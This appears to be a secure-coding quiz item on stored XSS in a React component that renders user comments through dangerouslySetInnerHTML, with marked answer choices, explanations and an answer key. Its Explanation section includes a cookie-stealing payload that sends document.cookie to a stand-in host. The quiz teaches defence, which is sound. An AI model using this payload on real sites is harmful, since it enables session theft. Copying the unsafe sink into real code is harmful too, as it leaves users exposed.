---
title: "User comments through dangerouslySetInnerHTML"
module: f9
type: bug-hunt
source: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#framework-security"
tags: ["security", "xss", "react"]
stack: ["react", "owasp"]
choices:
  - text: "It's safe: `<script>` tags inserted this way don't run"
    why: "True of `<script>`, but `<img src=x onerror=\"...\">` runs as soon as the image fails to load."
  - text: "Encode `body` with `encodeURIComponent` first"
    why: "Wrong encoding for the context. Users would see `%3Cb%3E`. Plain `{body}` already gets the right HTML encoding from React."
  - text: "Users' HTML is parsed as markup, so it can run script. Render `{body}` as text, or sanitise it if you need HTML"
    correct: true
    why: "React escapes `{body}`. `dangerouslySetInnerHTML`, like `innerHTML`, skips that. If users must write HTML, run it through DOMPurify first."
  - text: "Add a Content-Security-Policy and leave the component as is"
    why: "CSP is defence in depth, not a fix. It may not block every payload, and the unsafe sink is still there."
---

## Prompt

`body` is whatever a user typed into the comment box. What's wrong?

```tsx
function Comment({ body }: { body: string }) {
  return <div dangerouslySetInnerHTML={{ __html: body }} />;
}
```

## Explanation

A comment of `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">` runs in every reader's session. Prefer `<div>{body}</div>`. Outside React, use `textContent`, not `innerHTML`.
